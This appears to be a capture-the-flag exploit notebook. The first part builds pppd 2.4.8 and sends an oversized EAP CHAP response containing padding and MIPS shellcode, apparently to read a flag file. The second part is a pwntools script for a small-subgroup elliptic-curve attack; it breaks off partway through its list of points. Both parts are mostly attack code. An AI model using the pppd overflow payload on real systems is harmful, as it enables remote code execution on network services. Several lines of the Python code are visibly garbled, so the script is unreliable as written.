cd ppp/
git checkout ppp-2.4.8          // 
eap.c 1453
./configure
make -j8
make install
char sc[1024] = 
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xb8\
\x28\\x42\\x00Saaaaaaaaaaaaaaaaaaaaaaa\\x10\\x00\\x31\\x26\\x09\\xf8\\x20\\
x02\\x00\\x00\\x00\\x00\\x34\\xc7\\x43\\x00"
"\\x00\\x00\\x09\\x24\\x04\\x00\\xa9\\xaf\\x61\\x67\\x09\\x3c\\x66\\x6c\\x2
9\\x35\\x00\\x00\\xa9\\xaf\\xa5\\x0f\\x02\\x24\\x00\\x00\\xa4\\x27\\x26\\x2
8\\xa5\\x00\\x26\\x30\\xc6\\x00\\x0c\\x01\\x01\\x01"
"\\x25\\x20\\x40\\x00\\xa3\\x0f\\x02\\x24\\x4a\\x00\\x05\\x3c\\x30\\x59\\xa
5\\x34\\x00\\x01\\x06\\x24\\x0c\\x01\\x01\\x01"
"\\x04\\x00\\x04\\x24\\x4a\\x00\\x05\\x3c\\x30\\x59\\xa5\\x34\\x00\\x01\\x0
6\\x24\\x42\\x00\\x11\\x3c\\x98\\x66\\x31\\x36\\x09\\xf8\\x20\\x02\\x00\\x0
0\\x00\\x00";
        eap_chap_response(esp, id, hash,sc,1024);
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from gmpy2 import invert 
from Crypto.Util.number import bytes_to_long, long_to_bytes
from sympy.ntheory.modular import crt
import os, sys, IPython, string, itertools, hashlib
q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd
a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa
b = 0x56cbc73d8d2ad00e22f12b930d1d685136357d692fa705dae25c66bee23157b8
zero = (0, 0)
Px = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca
Py = 0x49ee01169c130f25853b66b1b97437fb28cfc8ba38b9f497c78f4a09c17a7ab2
P = (Px,Py)
def add(p1,p2):
  if p1 == zero:
    return p2
  if p2 == zero:
    return p1
  (p1x,p1y),(p2x,p2y) = p1,p2
  if p1x == p2x and (p1y != p2y or p1y == 0):
      return zero
  if p1x == p2x:
      tmp = (3 * p1x * p1x + a) * invert(2 * p1y , q) % q
  else:
      tmp = (p2y - p1y) * invert(p2x - p1x , q) % q
  x = (tmp * tmp - p1x - p2x) % q
  y = (tmp * (p1x - x) - p1y) % q
  return (int(x),int(y))
def mul(n,p):
  r = zero
  tmp = p
  while 0 > 1, add(tmp,tmp)
  return r
def pad(m):
  pad_length = q.bit_length()*2 - len(m)
  for _ in range(pad_length):
    m.insert(0,0)
  return m
def pointToKeys(p):
  x = p[0]
  y = p[1]
  tmp = x > 256) & (pow(2, 256) - 1)
  return (x,y)
points = [
    (5, 
(20808069300207100183274602530191091934616421500415559983001767812694046383
293, 
205593533380364858919179887976362111823835169213352520688714369824668942387
99)),
    (89, 
(87321197774501402310611885646409219233795421054641609481828830143175436651
426, 
466901930452622329561575516950396108824380557309666285159726370609695633098
66)),
    (2, 
(49178099549835497496092804753081995271929547140019044050868855365390396807
836, 0)),
    (7, 
(86146125282727845562122226604071938057523980421707149246250725876033942274
93, 
609992767480026417689321454484904371833589903739705135319750635137732064090
4)),
    (11, 
(51008778008673391062497828469861484466455044069701244145183958073802135538
658, 
523433306740675935540021627692970148392381525757330265483984680836483463119
80)),
    (17, 
(14696750475467784215169583906294161001133971866462370789734677852973205374
217, 
702465782501689885770595350012155579708865917561659059989847941443457667273
15)),
    (19, 
(20895542366258576140632165340163552561554430495525835251523963420841741236
644, 
702710495281948662967752762409690723588115265112135239149902396584333241952
12)),
    (223, 
(33915843799094333545554760659572845786178346115436807542504557673181864481
403, 
496193865490573898152627935104552519289867136829657828136701627350465842020
2)),
    (3, 
(84159891687508767784026420571706691065873921130895443950475386340963761964
016, 
745464686396890700449543179178778284965321583786981689325117112513564526209
93)),
    (8581, 
(33470372169722734937128117413340606305226550585578400687548265866353883215
651, 
583200267526644323386002397543215794981309016937526660817964540265575876768
24)),
    (227, 
(53608699644750835070492818729380419704224865129289968798986184002645439121
998, 
971257473632407019758389332199205445283596318002726783386281299455089400359
78)),
    (8447, 
(91461460792106566534049350033727180613118157473575961398494732841092332598
98, 
245899081922952781103828053653015885442578846319094688759479418276390624041
03)),
    (107, 
(10708673094034428846451419778167116988108408887215111563502121984160818926
680, 
540940274764874433991431322818795342817961308123430370723207675122305455776
91)),
    (2269, 
(59490645943475047361814592639777918222484133262003124538378640652564408139
893, 
899111636101348202622757143973336852737072896753238815552429362242772211055
77)),
    (13, 
(50813247780009476667181506340087720219076836217815846031916183043035364576
269, 
357033227656861457728814039743338076894256570399589467598647703548262338340
99)),
    (23, 
(94030407960330960258634236781257559344753015811842769908656144906988258881
646, 
107088554210599034415822197381758351880260871923685922578737098087178089453
01)),
    (53, 
(28609374879136662262288951682501353664111476201357383021243326520404502764
731, 
470359424505844092825047652642106098535354290293352253338840741736328607075
17)),
    (8887, 
(59862301912251085345514763921816766523276663413662381298623422582341001672
108, 
517778937344421532148965870396046323328281875697034465485876495287175682751
38)),
    (337, 
(19516183542063049445556856824103689173030070209813461115077216334013878038
397, 
220877224948131685466703202006055509342223114271166584633504894854821961652
23)),
    (5273, 
(46348766474975820016718266202930612934374051650124311390712813326347869618
956, 
357187448952316551560501835133903700759668019241793600484104706039837111774
55)),
    (457, 
(30109681826650770286832804444641171785449647086753924059170517664271518614
827, 
427218644008791110840306959982199202585623413567722031917673667520948523029
35)),
    (97, 
(30230760885355357028719810962776948731510346336167684991841989772111980127
180, 
908083636995400777848723738635334629181428633007583682331338440848496946454
77)),
    (61, 
(48775176294425274397879979550080275719919880113341178907151427600493536960
627, 
321508202506718409037080400721427897194114074269054785284327832233630148692
95)),
    (1163, 
(66477330604121050769013664729461625332682836650615614624502258541300122444
486, 
764020246007025389610712741008146858925720736814645258126775367652095445072
20)),
    (367, 
(49457425324598317599371211071689905886052889524828363188073867801883975888
819, 
212621422477412515160004960779907136425757470558448422296053797400140394907
94)),
    (2437, 
(37297992015356349674637948601585772480716755197390682409511710065255051579
542, 
707811146390953038497617025598326142658888021707420570843109445370130832860
84)),
    (101, 
(28423340852526200965655481757396237023197853930861537730403272121847513924
513, 
109936345924795138329877192922107557825598875221490339194468352183360454696
33)),
    (151, 
(52082500934393047346970576494959415331069044619992184425877193608577445858
090, 
193597290919150535329159319354339256481883289440324982878831719606752839182
13)),
    (31, 
(73326511909561687017146161003307111348328563924138852967496777244860812321
894, 
281871501939047756026148723580356175682835635155993764731841571456267480841
24)),
    (421, 
(88231861210801154619386577714504494873793095049745757100871455558575328268
749, 
504632716002732888188256343547425284921054997216288077475575685478396955857
79)),
    (1259, 
(34644564331339325559781816842729097921723585148199343494313771565855696117
779, 
698779366785443080949114924188664977697178444153574587258155516617846330104
15)),
    (113, 
(38684243678749317793538570032754907885148668563586870969703084073294273083
982, 